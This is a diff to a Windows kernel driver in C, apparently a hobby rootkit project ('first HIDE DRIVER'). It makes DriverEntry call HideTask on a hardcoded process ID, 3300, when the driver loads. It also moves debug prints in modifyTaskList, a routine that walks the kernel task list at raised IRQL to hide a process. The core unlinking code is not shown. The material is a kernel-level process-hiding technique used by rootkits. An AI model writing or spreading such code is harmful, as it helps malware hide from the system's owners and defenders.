@@ -4,17 +4,9 @@ NTSTATUS DriverEntry(PDRIVER_OBJECT pDriverObject, PUNICODE_STRING pRegistryPath
 {
 	pDriverObject->DriverUnload = UnloadDriver;
 	DebugMessage("Welcome to the first HIDE DRIVER!\n");
-	/*KIRQL irql;
-	//PKDPC dpcPtr;
 
-	irql = RaiseIRQL();
-	//dpcPtr = AcquireLock();
-	DebugMessage("IRQL Raised!\n");
-	//modifyTaskList(*pid);
-	DebugMessage("there will be: Modyfing TaskList!\n");
-	//ReleaseLock(dpcPtr);
-	LowerIRQL(irql);
-	DebugMessage("IRQL Lowered!\n");*/
+	DWORD a = 3300;
+	HideTask(&a);
 	return STATUS_SUCCESS;
 }
 
@@ -168,15 +160,15 @@ void modifyTaskList(DWORD pid)
 			DBG_TRACE("ListTasks", "--POP!--... You blew a fuse");
 			return;
 		}
-
-		DBG_PRINT2("    %d Tasks Listed\n", fuse);
-		DBG_PRINT2("modifyTaskList: Search[Done]...No task found with PID=%d\n", pid);
-		return;
 	}
+	DBG_PRINT2("    %d Tasks Listed\n", fuse);
+	DBG_PRINT2("modifyTaskList: Search[Done]...No task found with PID=%d\n", pid);
+	return;
 }
 
 void HideTask(DWORD* pid)
 {
+	DebugMessage("Entering HideTask()\n");
 	KIRQL irql;
 	PKDPC dpcPtr;
 
@@ -189,5 +181,6 @@ void HideTask(DWORD* pid)
 
 	ReleaseLock(dpcPtr);
 	LowerIRQL(irql);
+	DebugMessage("Leaving HideTask()\n");
 	return;
 }
